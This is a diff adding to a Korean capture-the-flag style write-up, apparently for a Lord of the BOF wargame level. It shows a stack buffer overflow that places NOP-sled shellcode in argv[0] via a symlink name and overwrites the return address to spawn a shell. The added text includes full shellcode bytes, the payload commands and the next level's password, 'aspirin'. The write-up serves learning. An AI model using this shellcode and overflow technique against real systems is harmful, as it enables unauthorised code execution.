@@ -272,7 +272,6 @@ argv[0]에는 파일명을 넣어주는 부분이다.
 [orge@localhost orge]$ ln -s troll `python -c "print '\x90'*200+'\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80'"`
 ln: cannot create symbolic link `��������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������1�Ph//shh/bin��PS�ᙰ
                                                ̀' to `troll': No such file or directory
-[orge@localhost orge]$
 ```
 
 <br>
@@ -304,18 +303,50 @@ tmp
 troll
 troll.c
 ????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????�?^1ɱ2?l?�??�?u��?�����2�Qi00tii0cjo?�QT?�?�?�?
-[orge@localhost orge]$
 ```
 
 <br>
 
+쉘코드를 적당한 지점에 넣었으니 쉘코드를 삽입한 지점에 `ret`주소를 다음과 같이 `overwrite` 해주면 될 것 같다.
 
+```python 
+[orge@localhost orge]$ ./`python -c "print '\x90'*200+'\xeb\x11\x5e\x31\xc9\xb1\x32\x80\x6c\x0e\xff\x01\x80\xe9\x01\x75\xf6\xeb\x05\xe8\xea\xff\xff\xff\x32\xc1\x51\x69\x30\x30\x74\x69\x69\x30\x63\x6a\x6f\x8a\xe4\x51\x54\x8a\xe2\x9a\xb1\x0c\xce\x81'"` `python -c "print 'A'*44+'\xbf\xbf\xbf\xbf'"`
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA����
+Segmentation fault
+```
 
 
 
 # Exploit
 
+쉘코드를 삽입한 지점인 `argv[0]` 의 주소는 이전 문제 풀이 방식과 동일하게 찾아내었다.
 
+문제 소스코드에 아래와 같은 코드를 추가하여 컴파일한다.
+
+```python
+[orge@localhost orge]$ cd tmp
+[orge@localhost tmp]$ vi troll.c
+printf("argv[0] addr: %#x\n",argv[0]); // argv[0] 주소 찾는 코드를 추가
+[orge@localhost tmp]$ gcc troll.c -o troll
+```
+
+<br>
+
+심볼릭 링크 파일을 동일하게 생성하고 argv[0] 주소를 확인한다.
+
+> argv[0] addr: 0xbffff965
+
+```python
+[orge@localhost tmp]$ ln -s troll `python -c "print '\x90'*200+'\xeb\x11\x5e\x31\xc9\xb1\x32\x80\x6c\x0e\xff\x01\x80\xe9\x01\x75\xf6\xeb\x05\xe8\xea\xff\xff\xff\x32\xc1\x51\x69\x30\x30\x74\x69\x69\x30\x63\x6a\x6f\x8a\xe4\x51\x54\x8a\xe2\x9a\xb1\x0c\xce\x81'"`
+[orge@localhost tmp]$ ./`python -c "print '\x90'*200+'\xeb\x11\x5e\x31\xc9\xb1\x32\x80\x6c\x0e\xff\x01\x80\xe9\x01\x75\xf6\xeb\x05\xe8\xea\xff\xff\xff\x32\xc1\x51\x69\x30\x30\x74\x69\x69\x30\x63\x6a\x6f\x8a\xe4\x51\x54\x8a\xe2\x9a\xb1\x0c\xce\x81'"` `python -c "print 'A'*44+'\xbf\xbf\xbf\xbf'"`
+argv[0] addr: 0xbffff965
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA����
+Segmentation fault (core dumped)
+```
+
+<br>
+
+쉘코드를 삽입한 `argv[0]`의 주소를 ret에 덮어써주고 아래와 같은 exploit 코드를 작성해 실행하면 `shell`을 획득할 수 있다.
 
 ```python
 [orge@localhost orge]$ ./`python -c "print '\x90'*200+'\xeb\x11\x5e\x31\xc9\xb1\x32\x80\x6c\x0e\xff\x01\x80\xe9\x01\x75\xf6\xeb\x05\xe8\xea\xff\xff\xff\x32\xc1\x51\x69\x30\x30\x74\x69\x69\x30\x63\x6a\x6f\x8a\xe4\x51\x54\x8a\xe2\x9a\xb1\x0c\xce\x81'"` `python -c "print 'A'*44+'\x65\xf9\xff\xbf'"`
@@ -328,3 +359,6 @@ aspirin
 bash$
 ```
 
+### Clear! password is….
+
+aspirin
